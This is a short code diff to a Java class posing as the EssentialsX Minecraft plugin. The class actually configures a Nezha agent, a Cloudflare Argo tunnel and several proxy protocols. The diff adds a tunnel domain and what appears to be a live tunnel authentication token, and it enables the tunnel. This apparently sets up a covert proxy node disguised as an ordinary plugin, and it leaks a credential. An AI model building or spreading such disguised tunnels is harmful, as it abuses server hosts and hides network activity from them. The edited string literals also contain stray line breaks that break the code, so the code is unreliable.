@@ -78,22 +78,24 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
-        env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "");
+        env.put("ARGO_PORT", "20383");
+        env.put("ARGO_DOMAIN", "greathost.jaing.eu.cc
+");
+        env.put("ARGO_AUTH", "eyJhIjoiYTc1NTVmMWE1OWE1NzBmYTg1MWVhYTlhZDE2ZjQwYTkiLCJ0IjoiOTU1NWNkZDItMzg3ZC00MGZmLWI2MTEtNDU0NjExZDE3MjE4IiwicyI6Ik9USXhORFV6T0dFdE16bGxPUzAwTVRCbUxUZzROVEl0TjJKbU1UVXdOV016WWpBMSJ9
+");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "20033");
+        env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "");
         env.put("BOT_TOKEN", "");
-        env.put("CFIP", "spring.io");
+        env.put("CFIP", "ip.sb");
         env.put("CFPORT", "443");
         env.put("NAME", "");
-        env.put("DISABLE_ARGO", "true");
+        env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
